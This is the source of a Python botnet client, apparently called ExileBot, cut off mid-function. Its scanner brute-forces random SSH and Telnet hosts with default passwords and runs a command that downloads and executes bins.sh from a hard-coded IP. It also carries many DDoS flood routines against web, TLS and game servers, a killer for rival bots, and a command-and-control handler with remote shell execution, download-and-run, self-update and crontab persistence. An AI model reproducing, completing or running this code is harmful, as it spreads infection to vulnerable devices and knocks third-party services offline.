import sys, os, threading, socket
import random, string, time, requests
from urllib.parse import urlparse

_ua = [
'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)',
'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
'Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
'Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0',
'Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19',
'Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70',
'Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 9.50',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; es-la) Opera 9.27',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 9.52',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10',
'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10',
'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22',
'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.27',
'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50',
'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60',
'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)',
'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)',
'Mozilla/4.61 (Macintosh; I; PPC)',
'Opera 9.7 (Windows NT 5.2; U; en)',
'Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2',
'Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60'
]

_rf = [
'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
'https://drive.google.com/viewerng/viewer?url=',
'http://www.google.com/translate?u=',
'https://developers.google.com/speed/pagespeed/insights/?url=',
'http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q=',
'https://add.my.yahoo.com/rss?url=',
'https://play.google.com/store/search?q=',
'http://www.google.com/?q=',
'http://regex.info/exif.cgi?url=',
'http://www.google.com/translate?u=',
'http://translate.google.com/translate?u=',
'http://validator.w3.org/checklink?uri=',
'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
'http://host-tracker.com/check_page/?furl=',
'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
'http://www.onlinewebcheck.com/check.php?url=',
'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
]

client = socket.socket()
_sync = True
_stop = threading.Event()
_ddos = []
_scan = []

# ////////////////////////////////////////////////////////////////////////////
# ///////////////////// SELF-REP SCANNER FUNCTIONS BELOW /////////////////////
# ////////////////////////////////////////////////////////////////////////////

def _SSHScan(_num, _wait, _tmout):
    #  ___ ___ _  _   ___
    # / __/ __| || | / __| __ __ _ _ _  _ _  ___ _ _
    # \__ \__ \ __ | \__ \/ _/ _` | ' \| ' \/ -_) '_|
    # |___/___/_||_| |___/\__\__,_|_||_|_||_\___|_|

    _crdntl = ["root:toor", "root:root", "admin:1234", "admin:admin", "guest:guest"]
    _blklst = ["127.0", "10.0", "192.168"]
    
    _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.89.200.158/bins.sh; curl -O http://23.89.200.158/bins.sh; chmod 777 bins.sh; sh bins.sh'
    
    # install SSH module
    try:
        import paramiko
    except:
        try:
            os.system('pip install paramiko')
        except:
            # panic mode
            try:
                os.system('pip3 install paramiko')
            except:
                pass # gahhhh! idk
    
    while not (_stop.is_set() or _num==0):
        # generate valid ipv4 address
        _ip = ''
        while True:
            _ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            _ok = True
            for x in _blklst:
                if _ip.startswith(x):
                    _ok = False
                    
            if _ok == True:
                break
                
        # scan for SSH connection
        _alive = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((_ip, int(22)))
            s.close()
            _alive = True
        except:
            pass
            
        # SSH host found! begin cracking...
        if _alive == True:
            _num -=1
            for cred in _crdntl:
                try:
                    _usr, _pwd = cred.split(':')
                    
                    # setup SSH connection
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(hostname=_ip, port=22, username=_usr, password=_pwd, timeout=3)
                    client.exec_command(_infect, timeout=5)
                    client.close()
                except:
                    pass
                if (_stop.is_set() or _num==0):
                    break
            if (_stop.is_set() or _num==0):
                break                    
            
def _TELScan(_num, _wait, _combo, _setup):
#  _____    _          _     ___
# |_   _|__| |_ _  ___| |_  / __| __ __ _ _ _  _ _  ___ _ _
#   | |/ -_) | ' \/ -_)  _| \__ \/ _/ _` | ' \| ' \/ -_) '_|
#   |_|\___|_|_||_\___|\__| |___/\__\__,_|_||_|_||_\___|_|

    _crdntl = ["root:toor", "root:root", "admin:1234", "admin:admin", "guest:guest"]
    _blklst = ["127.0", "10.0", "192.168"]
    
    _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.89.200.158/bins.sh; curl -O http://23.89.200.158/bins.sh; chmod 777 bins.sh; sh bins.sh'
    
    # install SSH module
    try:
        import telnetlib
        import getpass
    except:
        try:
            os.system('pip install telnetlib')
            os.system('pip install getpass')
        except:
            # panic mode
            try:
                os.system('pip3 install telnetlib')
                os.system('pip3 install getpass')
            except:
                pass # gahhhh! idk
    
    while not (_stop.is_set() or _num==0):
        # generate valid ipv4 address
        _ip = ''
        while True:
            _ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            _ok = True
            for x in _blklst:
                if _ip.startswith(x):
                    _ok = False
                    
            if _ok == True:
                break
                
        # scan for TELNET connection
        _alive = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((_ip, int(23)))
            s.close()
            _alive = True
        except:
            pass
            
        # TELNET host found! begin cracking...
        if _alive == True:
            _num -=1
            for cred in _crdntl:
                try:
                    _usr, _pwd = cred.split(':')
                    
                    # setup TELNET connection
                    tn = telnetlib.Telnet(_ip, 23)
                    
                    # wait for login prompt
                    tn.read_until(b"login: ", timeout=3)
                    
                    # send the username
                    tn.write(_usr.encode('ascii') + b"\n")
                    
                    # wait for password prompt
                    tn.read_until(b"Password: ", timeout=3)
                    
                    # send the password
                    tn.write(password.encode('ascii') + b"\n")
                    
                    # Wait for the shell prompt
                    tn.read_until(b"$ ", timeout=3)
                    
                    # send SELF-REP command
                    tn.write(_infect.encode('ascii') + b"\n")
                    
                    #tn.close()
                except:
                    pass
                if (_stop.is_set() or _num==0):
                    break
            if (_stop.is_set() or _num==0):
                break                    

# ///////////////////////////////////////////////////////////////////////
# ///////////////////////// DDOS FUNCTIONS BELOW ////////////////////////
# ///////////////////////////////////////////////////////////////////////

def _RECOIL(_domain, _path, _delay, _time):
    #  ___ ___ ___ ___ ___ _    
    # | _ \ __/ __/ _ \_ _| |   
    # |   / _| (_| (_) | || |__ 
    # |_|_\___\___\___/___|____|
    
    global _stop
    _quit = time.time() + int(_time)
    _url = 'http://' + _domain + _path
    
    while not (_stop.is_set() or time.time() > _quit):
        try:
            get_response = requests.get(_url, stream=True)
            _file  = _url.split("/")[-1]
            with open(_file, 'wb') as f:
                for chunk in get_response.iter_content(chunk_size=1): # accept 1 byte over the socket
                    if chunk: # filter out new keep-alive chunks
                        f.write(chunk) # write single byte to file
                        time.sleep(int(_delay)) # delay for x second/s...
            os.remove(_file)
        except:
            pass
    
def _RHEX(_ip, _prt, _range, _time):
    #  ___    _   _  _ ___   ___  __  __   _  _ _____  __
    # | _ \  /_\ | \| |   \ / _ \|  \/  | | || | __\ \/ /
    # |   / / _ \| .` | |) | (_) | |\/| | | __ | _| >  < 
    # |_|_\/_/ \_\_|\_|___/ \___/|_|  |_| |_||_|___/_/\_\

    global _stop
    _quit = time.time() + int(_time)

    # calculate byte range
    try:
        _min, _max = map(int, _range.strip().split('-'))
    except:
        _min, _max = 500, 4096
        
    while not (_stop.is_set() or time.time() > _quit):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((_ip, int(_prt)))
            s.send('frying routers since 1997 :D'.encode())
            
            while not (_stop.is_set() or time.time() > _quit):
                _hex = [format(random.randint(0, 255), '02x') for _ in range(random.randint(_min, _max))]
                payload = ''.join("\\x" + digit for digit in _hex)
                s.send(payload.encode())
                
            s.close()
        except:
            s.close()
            
def _STD(_ip, _prt, _time):
    #  ___ _____ ___      _  _ _____  __
    # / __|_   _|   \ ___| || | __\ \/ /
    # \__ \ | | | |) |___| __ | _| >  < 
    # |___/ |_| |___/    |_||_|___/_/\_\
    
    global _stop
    payload = '\x73\x74\x64\x00\x00\x00\x00\x01\x1b\x03\x3b\x34\x00\x00\x00\x05\x00\x00\x00\xb8\xef\xff\xff\x80\x00'
    payload += '\x00\x00\x68\xf0\xff\xff\xa8\x00\x00\x00\x78\xf0\xff\xff\x50\x00\x00\x00\x61\xf1\xff\xff\xc0\x00\x00'
    _quit = time.time() + int(_time)
    
    while not (_stop.is_set() or time.time() > _quit):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((_ip, int(_prt)))
            s.send('smacked by Exile! YEET lmao...'.encode())
            
            while not (_stop.is_set() or time.time() > _quit):
                s.send(payload.encode())
                
            s.close()
        except:
            s.close()
            
def _L7(_ip, _domain, _prt, _time, _useHex):
    #  _  _ _____ _____ ___     __  _  _ _____ _____ ___     _  _ _____  __
    # | || |_   _|_   _| _ \   / / | || |_   _|_   _| _ \___| || | __\ \/ /
    # | __ | | |   | | |  _/  / /  | __ | | |   | | |  _/___| __ | _| >  < 
    # |_||_| |_|   |_| |_|   /_/   |_||_| |_|   |_| |_|     |_||_|___/_/\_\
                                                                      
    global _stop, _ua
    _quit = time.time() + int(_time)
    
    _h = 'GET / HTTP/1.1\r\nHost:{}\r\nUser-agent:{}\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n{}'
    
    while not (_stop.is_set() or time.time() > _quit):
    
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((_ip, int(_prt)))
            # send initial header
            s.send(_h.format(_domain, random.choice(_ua), '').encode())
            
            while not (_stop.is_set() or time.time() > _quit):
                if _useHex == 'y':
                    _hex = [format(random.randint(0, 255), '02x') for _ in range(random.randint(50, 150))]
                    payload = ''.join("\\x" + digit for digit in _hex)

                    s.send(_h.format(_domain, random.choice(_ua), payload).encode())
                else:
                    s.send(_h.format(_domain, random.choice(_ua), '').encode())
                    
            s.close()
        except:
            s.close()

def _L4(_ip, _prt, _type, _range, _time):
    #  _   _ ___  ___     __  _____ ___ ___ 
    # | | | |   \| _ \   / / |_   _/ __| _ \
    # | |_| | |) |  _/  / /    | || (__|  _/
    #  \___/|___/|_|   /_/     |_| \___|_|  
    
    global _stop
    _quit = time.time() + int(_time)
    
    # calculate byte range
    try:
        _min, _max = map(int, _range.strip().split('-'))
    except:
        _min, _max = 500, 4096
            
    # run for duration
    while not (_stop.is_set() or time.time() > _quit):
    
        try:
            # setup socket
            s = socket.socket()
            
            if _type == 'udp':
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            s.settimeout(1)
            s.connect((_ip, int(_prt)))
            s.send('sniff packets not glue!'.encode())
            
            while not (_stop.is_set() or time.time() > _quit):
                _data = ''
                for _ in range(random.randint(_min, _max)):
                    _data += '$'
                s.send(_data.encode())
                
            s.close()
        except:
            s.close()

def _TLS(_ip, _time):
    #  _____ _    ___   _____  ___  _   _  _   _ ___ _____ ___ ___  _  _ 
    # |_   _| |  / __| | __\ \/ / || | /_\| | | / __|_   _|_ _/ _ \| \| |
    #   | | | |__\__ \ | _| >  <| __ |/ _ \ |_| \__ \ | |  | | (_) | .` |
    #   |_| |____|___/ |___/_/\_\_||_/_/ \_\___/|___/ |_| |___\___/|_|\_|
    
    global _stop
    _quit = time.time() + int(_time)
    
    try:
        import ssl, warnings
        warnings.filterwarnings("ignore", category=DeprecationWarning)
        # filter 'deprication' non-sense from SSL module
    except:
        pass
    
    payload = '\x16\x03\x03{}\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00'
    
    while not (_stop.is_set() or time.time() > _quit):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, 443))
            ssl_sock = ssl.wrap_socket(s)
            ssl_sock.send(payload.format('\x4d\x6f\x92\xc9').encode())

            while not (_stop.is_set() or time.time() > _quit):
                _hex = [format(random.randint(0, 255), '02x') for _ in range(4)]
                _junk = ''.join("\\x" + digit for digit in _hex)
                ssl_sock.send(payload.format(_junk).encode())

            ssl_sock.close()
            s.close()
        except:
            pass
            
def _multi(_ip, _prt, _type, _time):
    #  __    ____  _____  __________
    # |  \  /  | ||  |  | |_    _|__|
    # |   \/   |     |  |_  |  | |  |
    # |__|\/|__|____/|____| |__| |__|
    global _stop
    _quit = time.time() + int(_time)
    
    payload = ''
    if _type == 'fivem':
        payload = '\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a'
        #\xff\xff\xff\xffgetinfo xxx\x00\x00\x00
    elif _type == 'quake3':
        payload = '\xFF\xFF\xFF\xFFgetstatus xxx'
       # or you can use '\xff\xff\xff\xffgetinfo xxx' instead
    elif _type == 'ts3':
        payload = '\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    else:
        payload = '\xff\xff\xff\xffTSource Engine Query\x00'
            
    # run for duration
    while not (_stop.is_set() or time.time() > _quit):
    
        try:
            # setup socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((_ip, int(_prt))) # vse port 27015
            s.send('Go 2 sleep! Electronic packet strike by ExileBot')
            
            while not (_stop.is_set() or time.time() > _quit):
                s.send(payload.encode())
                
            s.close()
        except:
            s.close()
            
def _BYPASS(_ip, _domain, _prt, _time, _useSSL):
    #  _  _________________    _____   _____  __  ____  ____
    # | || |_   _|_   _| _ \  | _ \ \_/ / _ \/__\/ ___|/ ___|
    # | __ | | |   | | |  _/  | _ <\   /|  _/ __ \___ \___  \
    # |_||_| |_|   |_| |_|    |___/ |_| |_|/__||__\___/\____/
    global _stop, _ua, _rf
    _proxies = []
    
    # retreive proxies
    _file = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(15, 35)))
    try:
        if _useSSL == 'y':
            rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all')
            with open(_file, "wb") as fp:
                fp.write(rsp.content)
                fp.close()
        else:
            rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all')
            with open(_file, "wb") as fp:
                fp.write(rsp.content)
                fp.close()
    except Exception as e:
        print(e)
	    
    # load proxies
    try:
        with open(_file, "r") as f:
            for line in f:
                if "\n" in line:
                    # remove any carriage return/s
                    line = line.replace("\n", "")
                    _proxies.append(line)
    except:
        _proxies.append('socks4://127:0.0.1:9050') # attempt TOR
    
    
    _quit = time.time() + int(_time)
    static = "GET {} HTTP/1.1\r\nHost: {}\r\nUser-agent:{}\r\nReferer:{}{}\r\nConnection:close\r\n\r\n"
    i = 0
    
    while not (_stop.is_set() or time.time() > _quit):
        try:
            # format proxy
            prox = _proxies[i].lower()
            if '://' in prox:
                prox = prox.split("://")[1]

            _rhost, _rport = prox.split(':')

            # setup header
            junk = '/' + ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(15, 35)))
            _h = static.format(junk, _domain, random.choice(_ua), random.choice(_rf), _domain)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if _useSSL == 'y':
                try:
                    import ssl
                    s = ssl.wrap_socket(s)
                except:
                    pass
            s.connect((_rhost, int(_rport)))
            s.sendall(_h.encode())
            s.close()
            
            i +=1
            # reiterate through proxy list
            if i == len(_proxies):
                i = 0

        except:
            s.close()

    try:
        os.remove(_file)
    except:
        pass

def _HOLD(_ip, _prt, _socks, _delay, _time):
    #  _  _  ___  _    ___  
    # | || |/ _ \| |  |   \ 
    # | __ | (_) | |__| |) |
    # |_||_|\___/|____|___/ 
    # the most ghetto hold flood ever assembled smh
    
    global _stop
    _quit = time.time() + int(_time)
    _sockets = []
    
    while len(_sockets) != int(_socks):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _sockets.append(s)
            s.connect((_ip, int(_prt)))
            s.send('woe to the vanquied! #Rekt @ExileBot'.encode())
        except:
            pass
    
    while not (_stop.is_set() or time.time() > _quit):
        for x in _sockets:
            try:
                # send keep-alive
                if (_stop.is_set() or time.time() > _quit):
                    break
                x.send('\x00')
            except:
                _sockets.remove(x)
                # respawn dead socket
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    _sockets.append(s)
                    s.connect((_ip, int(_prt)))
                    s.send('Get pieced! Death comes on swift wings to the enemies of ExileBot...'.encode())
                except:
                    pass # idk bruh
        
        # this looks like a dumpster fire...
        _wait = time.time() + int(_delay)
        while True:
            if time.time()> _wait:
                break
            elif (_stop.is_set() or time.time() > _quit):
                break
    
    # attempt to close the socket/s
    for y in _sockets:
        try:
            y.close()
        except:
            pass
    
# ///////////////////////////////////////////////////////////////////////
# ///////////////////// MAIN CLIENT FUNCTIONS BELOW /////////////////////
# ///////////////////////////////////////////////////////////////////////

def _kill():
    _hitList = [
    "mips", "mips64", "mipsel", "sh2eb", "sh2elf", "powerpc", "powerpc440fp",
    "i586", "m68k", "sparc", "jackmymips", "jackmymips64", "jackmymipsel",
    "jackmysh2eb", "jackmysh2elf", "jackmysh4", "jackmyx86", "jackmyarmv5",
    "jackmyarmv4tl", "jackmyarmv4", "jackmyarmv6", "jackmyi686", "jackmypowerpc",
    "jackmypowerpc440fp", "jackmyi586", "jackmym68k", "jackmysparc", "jackmyx86_64",
    "hackmymips", "hackmymips64", "hackmymipsel", "hackmysh2eb", "hackmysh2elf",
    "hackmysh4", "hackmyx86", "hackmyarmv5", "hackmyarmv4tl", "hackmyarmv4",
    "hackmyarmv6", "hackmyi686", "hackmypowerpc", "hackmypowerpc440fp", "hackmyi586",
    "hackmym68k", "hackmysparc", "hackmyx86_64", "b1", "b2", "b3", "b4", "b5", "b6", 
    "b7", "b8", "b9", "b10", "b11", "b12", "b13", "b14", "b15", "b16", "b17", "b18",
    "b19", "b20", "busyboxterrorist", "DFhxdhdf", "dvrHelper", "FDFDHFC", "FEUB",
    "FTUdftui", "GHfjfgvj", "jhUOH", "JIPJIPJj", "JIPJuipjh", "kmymips", "kmymips64",
    "kmymipsel", "kmysh2eb", "kmysh2elf", "kmysh4", "kmyx86", "kmyarmv5",
    "kmyarmv4tl", "kmyarmv4", "kmyarmv6", "kmyi686", "kmypowerpc", "kmypowerpc440fp",
    "kmyi586", "kmym68k", "kmysparc", "kmyx86_64", "lolmips", "lolmips64", "lolmipsel",
    "lolsh2eb", "lolsh2elf", "lolsh4", "lolx86", "lolarmv5", "lolarmv4tl", "lolarmv4",
    "lolarmv6", "loli686", "lolpowerpc", "lolpowerpc440fp", "loli586", "lolm68k",
    "lolsparc", "RYrydry", "telmips", "telmips64", "telmipsel", "telsh2eb", "telsh2elf",
    "telsh4", "telx86", "telarmv5", "telarmv4tl", "telarmv4", "telarmv6", "teli686",
    "telpowerpc", "telpowerpc440fp", "teli586", "telm68k", "telsparc", "telx86_64",
    "TwoFacemips", "TwoFacemips64", "TwoFacemipsel", "TwoFacesh2eb", "TwoFacesh2elf",
    "TwoFacesh4", "TwoFacex86", "TwoFacearmv5", "TwoFacearmv4tl", "TwoFacearmv4",
    "TwoFacearmv6", "TwoFacei686", "TwoFacepowerpc", "TwoFacepowerpc440fp", "TwoFacei586",
    "TwoFacem68k", "TwoFacesparc", "TwoFacex86_64", "UYyuyioy", "XDzdfxzf", "xxb1", "xxb2",
    "xxb3", "xxb4", "xxb5", "xxb6", "xxb7", "xxb8", "xxb9", "xxb10", "xxb11", "xxb12",
    "xxb13", "xxb14", "xxb15", "xxb16", "xxb17", "xxb18", "xxb19", "xxb20",
    "busybotnet", "pppd", "pppoe", "wput"
    ]
    try:
        import psutil
    except:
        try:
            os.system('pip install psutil')
            os.system('pip3 install psutil')
        except:
            pass # tough luck bruh...

    print('[!] Bot-killer active!')
    for _targProc in _hitList:
        for proc in psutil.process_iter(['pid', 'name']):
            if  _targProc in proc.info['name'].lower():
                print('[!] Foreign bot detected! Removing ' + proc.info['name'])
                pid = proc.pid
                os.kill(pid, 9)

def _uexec(_url, _pth):
    print('[!] Downloading foreign binary at request of C2.')
    
    # extract filename from URL
    _filename = os.path.basename(_url)
    
    # check for path permissions / format
    if not os.access(_pth, os.W_OK):
        _pth = os.path.dirname(os.path.realpath(__file__)) + '/'
    else:
        if not _pth.endswith('/'):
            _pth += '/'
        if not _pth.startswith('/'):
            _pth = '/' + _pth
            
    _filename = _pth + _filename
    try:
        import urllib.request
        urllib.request.urlretrieve(_url, _filename)
    except Exception as e:
        print(e)
    
    print('[+] Executing ' + _filename)
    # execute
    if _url.lower().endswith('.c'):
        os.system('gcc ' + _filename)
        cd = os.path.dirname(_filename)
        run = cd + 'a.out'
        os.system(run)
    elif _url.lower().endswith('.sh'):
        os.system('bash ' + _filename)
    elif _url.lower().endswith('.py'):
        os.system('python ' + _filename)
    else:
        os.system(_filename)

def _process(_command):
    global client, _sync, _task, _stop
    argz = _command.split(' ')
    
    # UNINSTALL
    if _command.lower() == 'uninstall':
        print('[!] Uninstalling...')
        _sheol()
    # DISCONNECT
    elif _command.lower() == 'disconnect':    
        print('[-] Disconnecting...')
        client.close()
        _sync = False
        sys.exit()
    # RECONNECT
    elif _command.lower() == 'reconnect':
        print('[+] Reconnecting...')
        client.close()
        main()
    # UPLOAD/EXECUTION
    elif _command.lower().startswith('load'):
        z = threading.Thread(target=_uexec, args=(argz[1], argz[2]))
        z.start()
    # SCAN FOR / KILL BOTS
    elif _command.lower() == 'botkiller':
        r = threading.Thread(target=_kill)
        r.start()
    # RUN SHELL COMMAND
    elif _command.lower().startswith('sh'):
        print('[+] Executing shell command!')
        _command = _command[3:]
        os.system(_command)
    # UPDATE
    elif _command.lower().startswith('update'):
        print('[!] Updating client...')
        _url = argz[1]
        print('[~] Reaching out to retrieve new binary...')
        try:
            import urllib.request
            urllib.request.urlretrieve(_url, "client_update.py")
        except Exception as e:
            print(e)
        
        print('[+] Removing current binary from CronTab...')
        # remove old binary from CronTab
        crontab_file = os.path.expanduser('~/.crontab')
        try:
            with open(crontab_file, 'r') as file:
                lines = file.readlines()
        
            new_lines = [line for line in lines if '__file__' not in line]
            with open(crontab_file, 'w') as file:
                file.writelines(new_lines)
        except:
            pass
        
        print('[+] Executing new binary! Exiting...')    
        os.system('python client_update.py')

        # self destruct
        try:
            client.close()
        except:
            pass
        os.remove(__file__)
        sys.exit()
        
    # KILL FLOODS / SCANS
    elif _command.lower().startswith('kill'):
        # set abort event
        _stop.set()

        # kill ddos attack/s
        if argz[1].lower() == 'floods':
            for _flood in _ddos:
                try:
                    _flood.join()
                except:
                    pass
        # kill self-rep scans
        elif argz[1].lower() == 'scans':
            for _enum in _scan:
                try:
                    _enum.join()
                except:
                    pass
        
        _ddos.clear() # clear ddos list
        _scan.clear() # clear scan list
        _stop.clear() # reset false value to thread event
        
    # UDP / TCP FLOOD
    elif (_command.lower().startswith('!udp') or _command.lower().startswith('!tcp')):
        _t = ''
        if _command.lower().startswith('!udp'):
            _t = 'udp'
        else:
            _t = 'tcp'
            
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] ' + _t.upper() + ' FLOOD @ ' + _ip + ':' + argz[2] + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[5])):
                _th = threading.Thread(target=_L4, args=(_ip, argz[2], _t, argz[3], argz[4]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()
                
    # STDHEX
    elif _command.lower().startswith('!stdhex'):
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] STDHEX FLOOD @ ' + _ip + ':' + argz[2] + ' FOR ' + argz[3] + ' SECONDS!\033[37m')
            for _ in range(int(argz[4])):
                _th = threading.Thread(target=_STD, args=(_ip, argz[2], argz[3]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()

    # RHEX
    elif _command.lower().startswith('!rhex'):
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] RHEX FLOOD @ ' + _ip + ':' + argz[2] + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[5])):
                _th = threading.Thread(target=_RHEX, args=(_ip, argz[2], argz[3], argz[4]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()

    # HTTP / HTTPHEX
    elif (argz[0].lower() == '!http' or argz[0].lower() == '!httphex'):
        _useHex = 'n'
        _t = 'http'
        if _command.lower().startswith('!httphex'):
            _useHex = 'y'
            _t = 'httphex'
            
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] ' + _t.upper() + ' FLOOD @ ' + _domain + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[4])):
                _th = threading.Thread(target=_L7, args=(_ip, _domain, argz[2], argz[3], _useHex))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()
    
    # HTTP BYPASS
    elif _command.lower().startswith('!httpbypass'):
        _useSSL = 'n'
        if argz[5].lower() == 'y':
            _useSSL = 'y'
            
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] L7-BYPASS FLOOD @ ' + _domain + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[4])):
                _th = threading.Thread(target=_BYPASS, args=(_ip, _domain, argz[2], argz[3], _useSSL))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()
    
    # RECOIL
    elif _command.lower().startswith('!recoil'):
        _ip, _domain = _rslv(argz[1])
        
        # format file-path
        _path = argz[2]
        if not _path.startswith('/'):
            _path = '/' + _path
        if _path.endswith('/'):
            _path = _path[:-1]
        
        if not _domain == '':
            print('\033[31m[+] RECOIL FLOOD @ ' + _domain + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[5])):
                _th = threading.Thread(target=_RECOIL, args=(_domain, _path, argz[3], argz[4]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()
                
    # TLS
    elif _command.lower().startswith('!tls'):
        _ip, _domain = _rslv(argz[1])
        if not _domain == '':
            print('\033[31m[+] TLS FLOOD @ ' + _domain + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[3])):
                _th = threading.Thread(target=_TLS, args=(_ip, argz[2]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()

    # HOLD
    elif _command.lower().startswith('!hold'):
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] HOLD FLOOD @ ' + _domain + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[6])):
                _th = threading.Thread(target=_HOLD, args=(_ip, argz[2], argz[3], argz[4], argz[5]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()
                
    # VALVE SOURCE ENGINE / FIVE-M / QUAKE3 / TEAMSPEAK3
    elif (_command.lower().startswith('!vse') or _command.lower().startswith('!fivem') or _command.lower().startswith('!quake3') or _command.lower().startswith('!ts3')):
    
        _type = argz[0][1:].lower()
        _ip, _domain = _rslv(argz[1])
        if not _ip == '':
            print('\033[31m[+] ' + _type.upper() + ' FLOOD @ ' + _ip + ' FOR ' + argz[4] + ' SECONDS!\033[37m')
            for _ in range(int(argz[4])):
                _th = threading.Thread(target=_multi, args=(_ip, argz[2], _type, argz[3]))
                _th.daemon = True
                _ddos.append(_th)
                _th.start()

    # ACTIVATE SCANNER
    elif _command.lower().startswith('scan'):
        print('[!] Starting SELF-REP scan...')
        _r = threading.Thread()
        if argz[1].lower() == 'ssh':
            _r = threading.Thread(target=_SSHScan, args=(argz[2], argz[3], argz[4]))
        else:
            _r = threading.Thread(target=_TELScan, args=(argz[2], argz[3], argz[4]))
        
        _scan.append(_r)
        _r.daemon = True
        _r.start()

def _persist():
    content = '''#!/bin/bash

_progname="''' + sys.argv[0] + '''"
_cmd="python3 ''' + __file__ + '''"

if ! crontab -l | grep -q "$_progname"; then
    (crontab -l 2>/dev/null; echo "@reboot $_cmd") | crontab -
fi

rm -f $0'''
    try:
        with open("rexec.sh", "w") as file:
